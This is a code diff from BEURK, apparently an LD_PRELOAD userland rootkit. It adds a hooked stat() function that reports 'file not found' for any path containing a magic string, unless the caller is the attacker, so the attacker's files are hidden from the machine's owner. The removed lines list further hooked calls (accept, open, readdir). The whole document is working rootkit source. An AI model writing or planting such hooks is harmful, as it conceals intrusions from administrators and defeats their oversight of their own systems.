@@ -18,21 +18,22 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <errno.h> /* errno, ENOENT */
+#include <string.h> /* strstr() */
+#include "beurk.h"
+#include "config.h"
+#include "hooks.h"
 
-#include <dirent.h> /* struct dirent, DIR */
-#include <sys/socket.h> /* struct sockaddr, socklen_t */
-#include <sys/stat.h> /* struct stat */
+int stat(const char *pathname, struct stat *buf) {
+    DEBUG(D_INFO, "called stat(2) hook");
 
-# define _HOOKED __attribute__((visibility("default")))
+    if (is_attacker())
+        return (REAL_STAT(pathname, buf));
 
-/** Function hooks prototypes
- *
- * This header file contains ALL protypes of hooked functions.
- */
+    if (strstr(pathname, MAGIC_STRING)) {
+        errno = ENOENT;
+        return (-1);
+    }
 
-
-int             accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) _HOOKED;
-int             open(const char *path, int oflag, ...) _HOOKED;
-struct dirent   *readdir(DIR *dirp) _HOOKED;
-int             stat(const char *pathname, struct stat *buf) _HOOKED;
+    return (REAL_STAT(pathname, buf));
+}
